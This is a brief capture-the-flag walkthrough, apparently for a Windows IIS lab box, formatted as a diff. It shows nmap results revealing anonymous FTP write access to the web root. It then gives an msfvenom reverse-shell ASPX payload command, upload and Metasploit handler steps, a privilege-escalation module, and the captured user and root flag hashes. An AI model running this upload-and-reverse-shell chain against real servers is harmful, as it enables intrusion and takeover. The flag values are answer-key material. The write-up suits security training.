@@ -1,0 +1,35 @@
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  02:06AM       <DIR>          aspnet_client
+| 06-26-19  06:57PM                 2870 devel.aspx
+| 03-17-17  05:37PM                  689 iisstart.htm
+|_03-17-17  05:37PM               184946 welcome.png
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: IIS7
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+port 21 anon login was possible logged in and found the dir file directly of aspx web host
+so we can upload the shell
+
+msfvenom -p windows/meterepreter_reverse_tcp LHOST=<ip> LPORT=4444 -f aspx > shell.aspx
+
+logged in ftp anon
+
+put shell.aspx
+
+run metaploit
+
+-use exploit/multi/handler
+-set payload windows/meterpreter_reverse_tcp
+-get the base shell and background
+-use windows/local/ppr_flatten_rec #for prive esc latest exploit
+
+
+user.txt 9ecdd6a3aedf24b41562fea70f4cb3e8
+root.txt e621a0b5041708797c4fc4728bc72b4b
